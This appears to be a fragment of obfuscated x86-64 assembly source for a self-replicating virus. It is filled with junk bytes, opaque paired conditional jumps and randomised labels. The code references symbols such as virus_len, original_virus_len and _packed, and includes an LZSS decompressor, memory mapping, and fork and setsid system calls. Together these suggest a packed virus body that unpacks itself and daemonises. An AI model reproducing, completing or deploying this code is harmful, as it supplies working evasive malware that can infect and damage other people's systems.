    mov         QWORD [rsp+_LZSSD_OFF.inputaddr], r1
    jmp         $+3
db 0x8b
    jb          ..@kk5Y3wAnQB2Y
    jae         ..@kk5Y3wAnQB2Y
..@d9zZIYuIVLOv:
    call        Processes
    jmp         $+4
db 0x08, 0x74
    jmp         ..@X0k1ugMVkSc5
..@mvdk8qBYoNG5:
    jz          ..@vmjj7ypcRmPX
    jmp         ..@UVzp5fGqb5So
..@MFztPXviBJmV:
    mov         rax, rax
    jmp         $+4
db 0x39, 0x57
    jmp         $+3
db 0x0f
    jl          ..@1fpNcEAPC2Cr
    jge         ..@1fpNcEAPC2Cr
..@E2Cq7DXMh7eH:
    jnz         ..@0h66SsY5yiYX
    jmp         ..@J7lFKyIT0w4m
..@ZKq9N6gVlonO:
    xchg        rbx, rbx
    jmp         $+4
db 0xd1, 0x85
    jmp         $+4
db 0x92, 0x8e
    js          ..@CJzV2SKpQ6ft
    jns         ..@CJzV2SKpQ6ft
..@OC2PXoYa2cdx:
    mov         rdx, rdx
    jmp         $+4
db 0x29, 0x47
    jmp         $+4
db 0x8a, 0xee
    js          ..@3XCjsy31Bqef
    jns         ..@3XCjsy31Bqef
..@T3WGgjm59vtW:
    mov         rcx, rcx
    jmp         $+5
db 0x77, 0x04, 0x74
    jmp         $+5
db 0xcd, 0xdf, 0x37
    jl          ..@ApvdIab3xlCG
    jge         ..@ApvdIab3xlCG
..@RK1GMgv9ncw1:
    mov         rcx, rcx
    jb          ..@fGqlXjbFfxVI
    jae         ..@fGqlXjbFfxVI
..@5rJIUEH2kn5a:
%ifdef X86_32
    push        ebp
%endif
    jmp         ..@HmRQgQO86c7E
..@f6Yu7bKiPOI6:
    sub         rdi, 1
    jmp         ..@A8OcF6wahAV0
..@Cjzuw5r925Zj:
    mov         dl, BYTE [rsp+_LZSSD_OFF.bits_buf]
    jmp         $+5
db 0x86, 0x7f, 0x8e
    jb          ..@EZAsQCnnLJvY
    jae         ..@EZAsQCnnLJvY
..@WIli38zajada:
    push        rax
    jmp         $+5
db 0x1b, 0x92, 0x58
    je          ..@vfGWiazjLlVw
    jne         ..@vfGWiazjLlVw
..@1fpNcEAPC2Cr:
    jnz         ..@ExFQi9zRet3x
    jmp         ..@QSpVMrwh4waS
..@qF1ft0RKlqdE:
    jmp         ..@2ofygtZbSFaB
    jl          ..@Cq6pWRi2ClNJ
    jge         ..@Cq6pWRi2ClNJ
..@HopiMvDZtamp:
    xor         rax, rax
    jl          ..@TKLRrBzRZXRC
    jge         ..@TKLRrBzRZXRC
..@b2y5lS4ZZi13:
    pop         r3
    js          ..@Oy7nJ1WRp4fh
    jns         ..@Oy7nJ1WRp4fh
..@dtvYTy7W3x0N:
    mov         rdi, QWORD [rsp+3*bytes]
    jmp         $+3
db 0x77
    jb          ..@iXZB1TL5nTvN
    jae         ..@iXZB1TL5nTvN
..@EDgKplWCqtxZ:
%ifdef X86_32
    push        rsi
%endif
    js          ..@bXN8OS9TqCJz
    jns         ..@bXN8OS9TqCJz
..@YI8KB48ONFq9:
    dec         r3
    jmp         $+5
db 0x2b, 0x20, 0x69
    jmp         $+5
db 0xc2, 0x0c, 0x71
    jmp         ..@w1A6X7bfeR4W
..@yYN9MQLO5YnC:
    mov         rcx, WINDOW_LENGTH-LOOKAHEAD_LENGTH 
    jmp         $+3
db 0x62
    jmp         $+4
db 0x57, 0x57
    jmp         ..@PxZ9VMQRunYF
..@J3PUMg3BwBbN:
    mov         rcx, rcx
    jmp         $+4
db 0xe9, 0xe0
    jb          ..@0xS7SCcrWuxK
    jae         ..@0xS7SCcrWuxK
..@CRrUV5naNhp3:
    mov         rcx, rcx
    jmp         ..@hlRAF8doTdPl
..@9Ct7XeU8uRxQ:
    push        rax
    jmp         $+5
db 0x08, 0xcd, 0x3f
    js          ..@VTpku87d7fGL
    jns         ..@VTpku87d7fGL
..@afVrrhkG9A7q:
    mov         rbp, rbp
    jmp         $+5
db 0x21, 0xb3, 0x85
    jb          ..@ikXcHwDxHJXE
    jae         ..@ikXcHwDxHJXE
..@MnSYWYC1QFTH:
    sub         rdx, rcx
    js          ..@oAWrvKpuoyPk
    jns         ..@oAWrvKpuoyPk
..@lzYcFQVCtRyX:
    mov         rdi, rdi
    jmp         $+4
db 0x4b, 0xf4
    jb          ..@9Ct7XeU8uRxQ
    jae         ..@9Ct7XeU8uRxQ
..@jzLuEGNtm9lS:
    mov         rdx, rdx
    jmp         ..@Mf0kqvUXupR6
..@RLEGoZT4IHDH:
    mov         r1, r5
    jmp         ..@IxwsmZNTCjvN
..@bXN8OS9TqCJz:
%ifdef X86_32
    pop         rsi
%endif
    jl          ..@JgPCVDjjQN1E
    jge         ..@JgPCVDjjQN1E
..@cMdAVOWoU5QI:
    push        rbx
    jmp         $+4
db 0xc6, 0xae
    jmp         $+5
db 0x7d, 0x83, 0xf2
    jl          ..@MyRE1HZtee05
    jge         ..@MyRE1HZtee05
..@fqMIZBeNEkph:
    inc         QWORD [rsp+_LZSSD_OFF.outputaddr]
    jmp         $+4
db 0xf4, 0xfe
    jmp         ..@InVOFomqH8NZ
..@E2IspAV6AuWd:
    xchg        rax, rax
    jmp         $+4
db 0xf9, 0x00
    jmp         $+3
db 0x94
    jmp         ..@oKZeAIG9zeKG
..@sfioBiRt2hRs:
    mov         rbx, rsi
    jmp         ..@MERZgoSTXHzW
..@lyEosg8gNbCM:
    xchg        rcx, rcx
    jmp         $+3
db 0xfc
    jmp         ..@w7Qnug9TU2DJ
..@ZOd7eE4Yn4o6:
    xor         rax, rax
    js          ..@SWMxdkhA8LFk
    jns         ..@SWMxdkhA8LFk
..@1xYgaUgsxSFI:
    push        rdi
    jl          ..@wPEpQpPctHEb
    jge         ..@wPEpQpPctHEb
..@nttAkx5ZBXPf:
    pop         rax
    js          ..@ZHdx2JQHduZF
    jns         ..@ZHdx2JQHduZF
..@d687MRaeUx6o:
    xchg        rax, rax
    jb          ..@d9zZIYuIVLOv
    jae         ..@d9zZIYuIVLOv
..@0KvhjAxWucqW:
    mov         QWORD [rsp+_LZSSD_OFF.bits], rax
    jmp         $+5
db 0xa0, 0xb9, 0xdf
    jb          ..@XZhoBpOqIEBt
    jae         ..@XZhoBpOqIEBt
..@HTzWq6HKiUw7:
    xor         rax, rax
    jb          ..@K6MWlDIaqYRH
    jae         ..@K6MWlDIaqYRH
..@FlOVMtKhoVWk:
    xor         rdx, rdx
    jmp         $+5
db 0xdc, 0x88, 0x30
    jmp         ..@Y6YkOVHtoRAB
..@wbzFJlhCxrxS:
    cmp         QWORD [r5], 0x0000000000000000
    jl          ..@IHEYg7ODV6Pk
    jge         ..@IHEYg7ODV6Pk
..@LqyZ8HwndGAa:
    inc         QWORD [rsp+_LZSSD_OFF.outputaddr]
    jmp         $+4
db 0xac, 0xfe
    jmp         ..@d4MRMUCNCZ5m
..@bFzpW4YPGTLP:
    xor         r3, r3
    jmp         $+5
db 0xdb, 0xf0, 0x9f
    js          ..@lzYcFQVCtRyX
    jns         ..@lzYcFQVCtRyX
..@FH6luOe8OwyB:
    mov         rsp, rsp
    js          ..@5SFFMlr83OkB
    jns         ..@5SFFMlr83OkB
..@Dak3BD7rTyo5:
    xor         r2, r2
    jmp         ..@larSBclb85Jb
..@vCAlXRKmGQus:
    xor         r4, r4
    jl          ..@ZQkEFVytXGbz
    jge         ..@ZQkEFVytXGbz
..@nocAZpraMNph:
    pop         rsi
    jmp         $+5
db 0x20, 0xa2, 0xb6
    jb          ..@v0ZGA9LAqJrc
    jae         ..@v0ZGA9LAqJrc
..@eEm4NocXQ5UG:
    mov         BYTE [rsp+_LZSSD_OFF.mask], 0x0
    jmp         ..@ao4y2Fe4SRoE
..@qOt6wZmGo3H3:
    and         DWORD [rsp+_LZSSD_OFF.index], WINDOW_LENGTH-1
    jmp         ..@FWeV36kJVfpx
..@mETynyO3cYSE:
    pop         rbx
    jmp         $+4
db 0x15, 0x91
    je          ..@sJcLPppENnJK
    jne         ..@sJcLPppENnJK
..@8SZWsIcr0SCS:
    xchg        rdx, rdx
    jmp         $+5
db 0xaf, 0x11, 0xc3
    jmp         $+5
db 0xf0, 0x04, 0x8d
    jmp         ..@oR3dMv0atTHe
..@0xS7SCcrWuxK:
    mov         m8, r5 
    jmp         ..@d687MRaeUx6o
..@Zda3qN4gc3LT:
    xor         r2, r2
    jmp         $+4
db 0xbd, 0xe7
    jmp         ..@WIli38zajada
..@Jaiizym97AjM:
    pop         rsi
    jmp         $+4
db 0x08, 0x6a
    jl          ..@EduunPs3RKy9
    jge         ..@EduunPs3RKy9
..@kwNHeNJ3LQqc:
    push        rdi
    jb          ..@RK1GMgv9ncw1
    jae         ..@RK1GMgv9ncw1
..@rY05z45JDsDI:
    push        rbx
    jmp         $+5
db 0xc1, 0x9d, 0x7b
    jl          ..@mETynyO3cYSE
    jge         ..@mETynyO3cYSE
..@9mjZrOSdxVQb:
    xchg        rdx, rdx
    jmp         ..@A8nAe7VG6Jds
..@DdAPM5kzoGiW:
    pop         rcx
    jb          ..@t9fsm2ezsTU0
    jae         ..@t9fsm2ezsTU0
..@TfaS6j7Vu8n0:
    jl          ..@ySjtsNDONNtH
    jmp         $+4
db 0x5c, 0x6e
    js          ..@zNwnlrVu0pNy
    jns         ..@zNwnlrVu0pNy
..@Oy7nJ1WRp4fh:
    pop         r2
    je          ..@n8gnG5Kp5Isq
    jne         ..@n8gnG5Kp5Isq
..@Qn8atMm9neCY:
    mov         r2, original_virus_len-non_packed_len
    jmp         $+4
db 0x37, 0xd2
    je          ..@PS8qNFwRVTgx
    jne         ..@PS8qNFwRVTgx
..@JGqfAooFG3Ta:
    mov         rdx, rdx
    jmp         $+4
db 0x61, 0x00
    jmp         Memmem
..@0h66SsY5yiYX:
    cmp         BYTE [rsp+_LZSSD_OFF.mask], 0x00
    je          ..@LgQ5MhtKMzRp
    jne         ..@LgQ5MhtKMzRp
..@kaeogLLxnJSb:
    mov         rcx, rcx
    jmp         $+3
db 0xff
    jl          ..@Pjv5DrAWwW2f
    jge         ..@Pjv5DrAWwW2f
..@rGAPRoO59VlU:
    mov         rcx, rcx
    jb          ..@PKK8qj9nWILT
    jae         ..@PKK8qj9nWILT
..@mb5pgfiDzYKN:
    mov         rcx, rcx
    jmp         ..@9mjZrOSdxVQb
..@pkhKdvlBGdAc:
    pop         rdi
    jmp         ..@hTqNdCIYTF9n
..@TzqYT5r6ajCN:
    pop         rsi
    jmp         $+3
db 0x48
    jl          ..@S35wrVmVecDK
    jge         ..@S35wrVmVecDK
..@hlRAF8doTdPl:
    xor         r2, r2
    jmp         $+5
db 0x63, 0xd8, 0x32
    jmp         $+5
db 0xf5, 0x7a, 0x17
    jmp         ..@WKvc0esB3jfX
..@kLsMtIYlb840:
    pop         rdi
    jmp         $+5
db 0xa8, 0xc9, 0x2f
    jmp         $+5
db 0x0e, 0x19, 0xb8
    jmp         $+3
db 0xc5
    jmp         $+3
db 0xaf
    jb          ..@xtDKeUdVrFX4
    jae         ..@xtDKeUdVrFX4
..@iQ5r4Q9oKO4d:
    push        rbx
    jmp         ..@X3AWZpqvFVrP
..@W2AVuBDpd0Xv:
    pop         rax
    je          ..@NWcUn6aoeTjl
    jne         ..@NWcUn6aoeTjl
..@NWcUn6aoeTjl:
    jmp         ..@Di3Oh11LswtL
    jmp         $+5
db 0xc8, 0xf5, 0x4b
    jmp         $+5
db 0x27, 0xe1, 0x77
    jmp         ..@ySjtsNDONNtH
..@e9qkibKxx8qF:
    push        rsi
    js          ..@TzqYT5r6ajCN
    jns         ..@TzqYT5r6ajCN
..@aANUZKQqYVXP:
    mov         QWORD [rsp+_UEC_OFF.mapaddr], rax
    jmp         $+5
db 0x93, 0x0d, 0x7c
    je          ..@c0GIIyLTh2oA
    jne         ..@c0GIIyLTh2oA
..@xtDKeUdVrFX4:
    mov         BYTE [rsp+_LZSSD_OFF.bits_buf], dl
    js          ..@4q57d0vLMliD
    jns         ..@4q57d0vLMliD
..@19bLQazbYDg0:
    GGLOBAL     virus_len
    jb          ..@gN7gLwbrjVP2
    jae         ..@gN7gLwbrjVP2
..@jXhCA6xhOsHP:
    mov         r3, QWORD [rsp+_UEC_OFF.mapaddr]
    jmp         ..@V7aWoD3bc8jh
..@9tugy9P52Jyr:
    mov         al, BYTE [r1]
    jmp         $+3
db 0x69
    jmp         $+5
db 0x92, 0xc9, 0xf8
    jmp         $+3
db 0x95
    jb          ..@jxtIdTvtl8FX
    jae         ..@jxtIdTvtl8FX
..@XkDOo74aY9lN:
    mov         rsi, rsi
    jmp         $+4
db 0x78, 0x0c
    jl          ..@L8bdoGYBs4sL
    jge         ..@L8bdoGYBs4sL
..@KAa8PGcGOF8A:
    mov         rbp, rbp
    jmp         $+4
db 0xd7, 0x6b
    jmp         $+3
db 0x30
    jl          ..@Hl98Cb8enU2f
    jge         ..@Hl98Cb8enU2f
..@N9c4GEKXM5me:
    push        rdi
    jmp         $+3
db 0x64
    jmp         $+3
db 0x49
    je          ..@3583zAnxJkau
    jne         ..@3583zAnxJkau
..@Hl98Cb8enU2f:
    mov         rax, r1
    jmp         ..@68iMP6xkHVqe
..@aiil8DTisKHY:
    pop         rdi
    jb          ..@Fp68cAXufrlm
    jae         ..@Fp68cAXufrlm
..@dXu6mjtiVpRq:
    mov         rcx, rcx
    jmp         $+5
db 0x68, 0xfd, 0x4e
    js          ..@e9qkibKxx8qF
    jns         ..@e9qkibKxx8qF
..@VbEcPqAHBero:
    xchg        rax, rax
    jl          ..@rcGrTCAP38hX
    jge         ..@rcGrTCAP38hX
..@vvgl8ISpceBY:
    mov         r4, m4
    jmp         $+4
db 0x94, 0xee
    js          ..@2ofygtZbSFaB
    jns         ..@2ofygtZbSFaB
..@DlgNVRyFDJdT:
%ifdef X86_64
    syscall
%endif
    jmp         $+5
db 0x48, 0x92, 0x5d
    js          ..@aANUZKQqYVXP
    jns         ..@aANUZKQqYVXP
..@79KLx2PfEyEE:
    push        rax
    je          ..@1uFpZ4aw5Ux5
    jne         ..@1uFpZ4aw5Ux5
Memmem:
    jmp         ..@slwigZSypIdy
..@UVzp5fGqb5So:
    xchg        rdx, rdx
    jmp         $+4
db 0xac, 0x6c
    jmp         ..@6qKD7AUt57dD
..@IVmPMWAwt3dc:
    test        eax, eax
    jmp         $+3
db 0x82
    jmp         $+4
db 0x91, 0x12
    jb          ..@B3sekPQUNKn0
    jae         ..@B3sekPQUNKn0
..@AeSxpVJqQGBg:
    pop         rsi
    jl          ..@2DpmoEgXxj50
    jge         ..@2DpmoEgXxj50
..@JVJdFzqIElvb:
    mov         rcx, rcx
    je          ..@lXtcJW7ck6lB
    jne         ..@lXtcJW7ck6lB
..@0jODHdzsYcHt:
    xchg        rsp, rsp
    jmp         $+4
db 0x3b, 0xc8
    jmp         ..@E2IspAV6AuWd
..@HGi7T06mgTw9:
%ifdef X86_64
    mov         esi, original_virus_len-non_packed_len
%endif
    jmp         $+4
db 0x0e, 0x9d
    jmp         $+3
db 0x67
    jmp         ..@gft53sH9Qf6o
..@4q57d0vLMliD:
    inc         QWORD [rsp+_LZSSD_OFF.inputaddr]
    js          ..@3ExdNzbKrodV
    jns         ..@3ExdNzbKrodV
..@uKro3JkA4Rkv:
    mov         rsp, rsp
    jb          ExitProgram
    jae         ExitProgram
..@J2QSTuowsqld:
    xchg        rsi, rsi
    jmp         ..@0jODHdzsYcHt
..@FLi7RV5Oq2AZ:
    pop         rcx
    js          ..@rfTrUpnQy0YG
    jns         ..@rfTrUpnQy0YG
..@EduunPs3RKy9:
    sub         rdi, 0x5
    jl          ..@B7X5nl76MomL
    jge         ..@B7X5nl76MomL
..@ZHdx2JQHduZF:
    ret
    jmp         $+5
db 0xe0, 0x53, 0xf7
    jmp         $+4
db 0xe0, 0xfd
..@gN7gLwbrjVP2:
    cmp         DWORD [r5], 0x00000000
    jl          ..@xp9Zw3kyAJHZ
    jge         ..@xp9Zw3kyAJHZ
..@1tItKDJoe7WZ:
    xor         r4, r4
    jmp         $+5
db 0xf7, 0x8f, 0xf4
    jb          ..@DdCLJQeMC9JM
    jae         ..@DdCLJQeMC9JM
..@Y8tX9Oh21NoA:
    push        rcx
    jmp         $+4
db 0x0a, 0x1d
    jmp         ..@3G45vTvFgLoM
..@ONE7poCgxt16:
    xchg        rsp, rsp
    jl          ..@i8qcD7qqJJwo
    jge         ..@i8qcD7qqJJwo
..@8TwWYOk6Co5C:
    mov         rbp, rbp
    je          ..@1hER72glVPKf
    jne         ..@1hER72glVPKf
..@dygxEEvXkF8z:
    pop         rdx
    jmp         $+3
db 0xe0
    jb          ..@ExFQi9zRet3x
    jae         ..@ExFQi9zRet3x
..@9EneUm92s2X2:
    pop         rcx
    jmp         ..@OC2PXoYa2cdx
..@0L24pyaeSHL5:
    call        rax
    jmp         $+5
db 0x12, 0xbc, 0xf4
    jmp         $+5
db 0x88, 0x96, 0x6d
    jmp         $+4
db 0x14, 0xac
    js          ..@L3zjTWGr7QKG
    jns         ..@L3zjTWGr7QKG
..@8ViMaI36YpmZ:
    mov         rax, r2
    jmp         ..@ziqKULHapxuP
..@ZQkEFVytXGbz:
    GGLOBAL     entrypoint
    jmp         ..@wbzFJlhCxrxS
..@pbnKmO8RFSjm:
    mov         edi, DWORD [rsp+_LZSSD_OFF.index]
    jmp         $+5
db 0xbf, 0x1a, 0xde
    jmp         ..@eM8s4vYMh3iw
..@Xv6ACzy2Mq8G:
    xchg        rsi, rsi
    jmp         ..@zPcS4PQZKWjW
..@7GahA8b0VQtl:
    xchg        rbx, rbx
    jmp         $+4
db 0xf0, 0xcb
    jmp         $+5
db 0x38, 0xd4, 0x01
    jmp         Strncmp
..@P5NlliboZt61:
%ifdef X86_32
    mov         eax, SYS_MMAP2
%endif
    jmp         ..@7O3qB8OQtpqZ
..@FUaKaBVVyDF5:
    mov         rbp, rbp
    jmp         $+3
db 0x5e
    jl          ..@B2fam27EgTDP
    jge         ..@B2fam27EgTDP
..@nR786uBldcvt:
    sub         r2, non_packed_len
    jmp         $+5
db 0x1b, 0x63, 0x4c
    jmp         $+5
db 0xaf, 0xc0, 0x29
    jmp         $+3
db 0xb6
    jmp         ..@jXhCA6xhOsHP
..@Di3Oh11LswtL:
    mov         rbx, rdi
    jmp         $+5
db 0x4d, 0x4d, 0xb9
    jmp         $+5
db 0xb0, 0x4f, 0x66
    jmp         ..@H8P2aIPnzQ9g
..@wMvYtAwCVPrd:
    mov         rsi, rsi
    jmp         $+4
db 0x27, 0xc7
    jl          ..@enWOBFpj9919
    jge         ..@enWOBFpj9919
..@n8gnG5Kp5Isq:
    pop         r1
    jmp         $+3
db 0x94
    je          ..@kwNHeNJ3LQqc
    jne         ..@kwNHeNJ3LQqc
..@TgZu0W2BdXFQ:
    mov         rdi, rbp
    jmp         $+3
db 0x31
    js          ..@JKUf8FyvmOkR
    jns         ..@JKUf8FyvmOkR
..@mwHFK81XzWfM:
    push        r1
    jmp         $+4
db 0x1e, 0xb4
    je          ..@NPfwCtHrtnLR
    jne         ..@NPfwCtHrtnLR
..@lPCBJi1jV9HP:
    syscall
    je          ..@T3WGgjm59vtW
    jne         ..@T3WGgjm59vtW
..@RB1H5sayqPuk:
    mov         rcx, QWORD [rsp]
    jmp         $+5
db 0x8d, 0xd8, 0xeb
    js          ..@BBLTz6nEFBGp
    jns         ..@BBLTz6nEFBGp
..@S35wrVmVecDK:
    call        Strlen
    jmp         ..@DYG8g4L84AeX
..@1QitokaQQN7C:
    rep         stosb
    jmp         ..@S8LTeewZMrMq
..@w7Qnug9TU2DJ:
    push        rsi
    jmp         ..@rZtBIlu3h6pa
..@a41Je5byOGES:
    mov         rdi, rdi
    jmp         $+5
db 0xe2, 0x27, 0x03
    jmp         $+4
db 0x79, 0x51
    jb          ..@12ECFe0mRY6V
    jae         ..@12ECFe0mRY6V
..@D03aNxqu3u28:
    mov         rax, rbx
    jl          ..@PyoEoatzauZw
    jge         ..@PyoEoatzauZw
..@TKLRrBzRZXRC:
    push        rdx
    jmp         $+3
db 0x78
    jmp         $+5
db 0x4c, 0xf3, 0xfe
    jb          ..@Irn6Ub8lPvTk
    jae         ..@Irn6Ub8lPvTk
..@HKUIca2CzrDL:
    push        rax
    jmp         $+4
db 0x93, 0x38
    jl          ..@nttAkx5ZBXPf
    jge         ..@nttAkx5ZBXPf
..@SWMxdkhA8LFk:
    mov         rax, SYS_FORK
    jl          ..@XKHLM5P7Yipt
    jge         ..@XKHLM5P7Yipt
..@lUMJQ26U5wUM:
    mov         rcx, 1
    jmp         ..@botkrrOaJksj
..@N3w1zFQ6gWJM:
    mov         rcx, rcx
    jmp         ..@79KLx2PfEyEE
..@A385WBCCz23z:
    mov         rbx, rbx
    jmp         $+4
db 0xec, 0x41
    jmp         $+3
db 0x9d
    jb          ..@s1FYVXTudbWQ
    jae         ..@s1FYVXTudbWQ
..@dneE85P8yf1H:
    mov         rsp, rsp
    jmp         $+4
db 0xa9, 0x4f
    jl          ..@tJ5XOZ4bCHuT
    jge         ..@tJ5XOZ4bCHuT
..@R1vv7JBTHdfG:
    test        rax, rax
    jl          ..@uEAZsAezPcLC
    jge         ..@uEAZsAezPcLC
..@EtRFBJeJmanI:
    pop         rsi
    jmp         $+5
db 0x2c, 0x5d, 0xcf
    jmp         ..@yYN9MQLO5YnC
..@DsbIQOT0sO2j:
    rep         nop
    jmp         $+5
db 0xee, 0x4c, 0xfa
    jmp         ..@egmjo51B2YIV
..@454RyWBnBTVO:
    jz          ..@5SFFMlr83OkB
    jmp         ..@Vy4pnA0kCaFo
..@twxa6qx8Itby:
    jz          ..@Zda3qN4gc3LT
    jmp         $+5
db 0x45, 0x82, 0x35
    jmp         $+3
db 0xfa
    jb          ..@QEE2zpocrizz
    jae         ..@QEE2zpocrizz
..@RTAcnw7mZu79:
    mov         rsi, rsi
    jmp         $+5
db 0x3b, 0x9b, 0xf7
    js          ..@9IYLIiAhAxCV
    jns         ..@9IYLIiAhAxCV
..@LbEwI7YUghOF:
    rep         nop
    jb          ..@f6Yu7bKiPOI6
    jae         ..@f6Yu7bKiPOI6
..@IxwsmZNTCjvN:
    mov         rsp, rsp
    jmp         $+3
db 0xd0
    jmp         $+5
db 0x09, 0xbd, 0xe0
    jl          ..@fiYjkfR90fPm
    jge         ..@fiYjkfR90fPm
..@TnPITOFudfLv:
    jz          ..@8ViMaI36YpmZ
    jmp         $+5
db 0xa1, 0xb9, 0xfb
    jmp         $+4
db 0x94, 0x19
    js          ..@Ym4L7oGJUFn2
    jns         ..@Ym4L7oGJUFn2
..@B3sekPQUNKn0:
    mov         rsp, rsp
    jb          ..@1xYgaUgsxSFI
    jae         ..@1xYgaUgsxSFI
..@3nzowiEDfwJR:
    mov         eax, SYS_SETSID
    jmp         $+4
db 0x4b, 0xfd
    jl          ..@9R6Egcq0Gok4
    jge         ..@9R6Egcq0Gok4
..@oJBgMaXhia3I:
    pop         rdx
    jmp         $+5
db 0xa8, 0x13, 0xa9
    jl          ..@MLfG6nqmDCRn
    jge         ..@MLfG6nqmDCRn
..@P68dpqjhS24V:
    xor         r1, r1
    jb          ..@A385WBCCz23z
    jae         ..@A385WBCCz23z
..@botkrrOaJksj:
    mov         rbx, rbx
    jb          ..@lyEosg8gNbCM
    jae         ..@lyEosg8gNbCM
..@yk4uotmDpYPb:
    ret
    jb          ..@7GahA8b0VQtl
    jae         ..@7GahA8b0VQtl
..@mytIejAYffy1:
    jl          ..@1CCycREYpSLF
    jmp         $+5
db 0x75, 0xc8, 0xf2
    jmp         ..@IVmPMWAwt3dc
..@X3AWZpqvFVrP:
    pop         rbx
    js          ..@O7GFubfb0kQ2
    jns         ..@O7GFubfb0kQ2
..@X0k1ugMVkSc5:
    push        rsi
    js          ..@tBjL8p9mw6JE
    jns         ..@tBjL8p9mw6JE
..@FWeV36kJVfpx:
    jmp         ..@lUMJQ26U5wUM
    jmp         $+5
db 0x80, 0x42, 0xcb
    jmp         $+4
db 0x17, 0x34
    je          ..@Xv6ACzy2Mq8G
    jne         ..@Xv6ACzy2Mq8G
..@68iMP6xkHVqe:
    push        rdx
    jmp         $+5
db 0xfd, 0x57, 0x3e
    jmp         ..@lRu7g1IwkP4w
..@KHgaALs7lUan:
    mov         rsi, rax 
    jmp         $+3
db 0x74
    jmp         $+3
db 0x9b
    jmp         ..@uyNEU4jviFjC
..@QSpVMrwh4waS:
    xchg        rdx, rdx
    jl          ..@RTAcnw7mZu79
    jge         ..@RTAcnw7mZu79
..@MLfG6nqmDCRn:
    syscall
    jb          Strlen
    jae         Strlen
..@rZtBIlu3h6pa:
    pop         rsi
    jmp         $+3
db 0x66
    jmp         ..@nxEAZQVTXtER
..@rp5lgphV61yP:
    add         ecx, 1
    jmp         $+4
db 0x5c, 0x4a
    jmp         ..@44q2JvE8iIrP
..@PyoEoatzauZw:
    add         rsp, 4*bytes
    jmp         $+3
db 0x1f
    jl          ..@rNotIrzmuWLd
    jge         ..@rNotIrzmuWLd
..@fSOhaNNpmH8X:
    push        rdx
    jmp         $+3
db 0x7f
    jl          ..@oJBgMaXhia3I
    jge         ..@oJBgMaXhia3I
..@Cuq1dsk1Fw85:
    sub         rsp, _UEC_OFF_size
    jmp         $+3
db 0x5b
    jl          ..@gIszbnmmhcnK
    jge         ..@gIszbnmmhcnK
..@njgYcA6TCHlV:
    push        rcx
    jmp         $+5
db 0x52, 0xa7, 0x75
    jl          ..@k8AJSXHH98EC
    jge         ..@k8AJSXHH98EC
..@PKK8qj9nWILT:
    GGLOBAL     _packed
    je          ..@J3PUMg3BwBbN
    jne         ..@J3PUMg3BwBbN
..@fGqlXjbFfxVI:
    pop         rdi
    jb          ..@KoLfE9GdTHrp
    jae         ..@KoLfE9GdTHrp
..@rery29DinOsE:
    xor         rax, rax
    jmp         ..@njgYcA6TCHlV
..@rFUsW2sxPniV:
    mov         rsp, rsp
    jl          ..@HKUIca2CzrDL
    jge         ..@HKUIca2CzrDL
..@Cq6pWRi2ClNJ:
    mov         rbp, rbp
    js          ..@Zda3qN4gc3LT
    jns         ..@Zda3qN4gc3LT
..@5lVxATUKdNRA:
    xchg        rbx, rbx
    je          ..@1tItKDJoe7WZ
    jne         ..@1tItKDJoe7WZ
..@B7X5nl76MomL:
    INIT_MX_VAR
    jmp         $+3
db 0x9f
    jmp         $+4
db 0x7c, 0x81
    jmp         $+5
db 0xb7, 0x49, 0x6d
    jl          ..@mXSrf9Bun6oY
    jge         ..@mXSrf9Bun6oY
..@1Azdswq1ovvo:
    add         r1, 1
    jmp         $+4
db 0x09, 0x37
    jmp         $+5
db 0x02, 0xdc, 0x98
    jl          ..@7ZqPs9frHcU7
    jge         ..@7ZqPs9frHcU7
..@MWVXM9AvwqOk:
    mov         rbx, [rsp+_LZSSD_OFF.outputaddr] 
    jmp         $+5
db 0x22, 0x66, 0x80
    je          ..@zpwMIVFZdjrM
    jne         ..@zpwMIVFZdjrM
..@vHydLlB8jPHG:
    push        rdi
    js          ..@pkhKdvlBGdAc
    jns         ..@pkhKdvlBGdAc
..@mS4CpCNGIihx:
    mov         rcx, rcx
    je          ..@MdWhTqXmE3QD
    jne         ..@MdWhTqXmE3QD
..@Y6YkOVHtoRAB:
    xor         rbx, rbx
    jb          ..@rbVw5MPI8lmS
    jae         ..@rbVw5MPI8lmS
..@H9TKj7FleQUW:
    mov         al, BYTE [rsp+_LZSSD_OFF.buffer+rbx]
    jmp         ..@MWVXM9AvwqOk
..@Z1qSgjyzZwYf:
    mov         rbp, rbp
    jb          ..@CTTphbNKfhk1
    jae         ..@CTTphbNKfhk1
..@xbizjNWyp8m2:
    mov         r3, rax
    jmp         ..@vvgl8ISpceBY
..@Xt4TrbjG3lo0:
    jz          ..@D03aNxqu3u28
    jmp         $+5
db 0xaf, 0xb9, 0x76
    jmp         ..@yWBXwTVporWE
..@oR3dMv0atTHe:
    ret
    jmp         ..@iYJgvY011XXt
..@kKFYsfpbFTPt:
    xchg        rsi, rsi
    jb          ..@sfioBiRt2hRs
    jae         ..@sfioBiRt2hRs
..@ipBl9ZV7IXhg:
    xchg        rcx, rcx
    jmp         $+4
db 0x3f, 0xf3
    jmp         ..@KHH3ECFdGWSH
..@rNe4FpK13nxq:
    push        rdi
    jmp         ..@kLsMtIYlb840
..@vXh5jIL6Ry9g:
    add         rsp, _LZSSD_OFF_size
    jmp         $+5
db 0x7f, 0xd2, 0x8e
    jl          ..@TNxk7Ve13J6k
    jge         ..@TNxk7Ve13J6k
..@2DpmoEgXxj50:
    mov         QWORD [rsp+_LZSSD_OFF.outputaddr], r3
    jmp         ..@eEm4NocXQ5UG
..@YnwXLSQ8c9uC:
    mov         rbx, rbx
    jmp         $+5
db 0x2f, 0x3d, 0xe5
    jmp         $+3
db 0x84
    jmp         $+3
db 0x48
    js          ..@19bLQazbYDg0
    jns         ..@19bLQazbYDg0
..@wPEpQpPctHEb:
    pop         rdi
    jmp         $+3
db 0x56
    js          ..@ec62ur0toYYM
    jns         ..@ec62ur0toYYM
..@Mf0kqvUXupR6:
    xor         rax, rax
    je          ..@3nzowiEDfwJR
    jne         ..@3nzowiEDfwJR
..@uyNEU4jviFjC:
    mov         rcx, LENGTH_BITS
    jb          ..@uo5TM8yeNcEV
    jae         ..@uo5TM8yeNcEV
..@cQY0enSdnfq2:
    xchg        rdi, rdi
    jmp         $+5
db 0x88, 0x98, 0x30
    jmp         ..@HopiMvDZtamp
..@jxtIdTvtl8FX:
    cmp         BYTE [r2], al
    jmp         $+5
db 0x08, 0xd0, 0xca
    jl          ..@Ny0CTryciqJe
    jge         ..@Ny0CTryciqJe
..@9R6Egcq0Gok4:
    push        rdx
    js          ..@jCbbz3h3qfpk
    jns         ..@jCbbz3h3qfpk
..@RU3XxFkCYQIy:
    push        rdx
    jmp         $+3
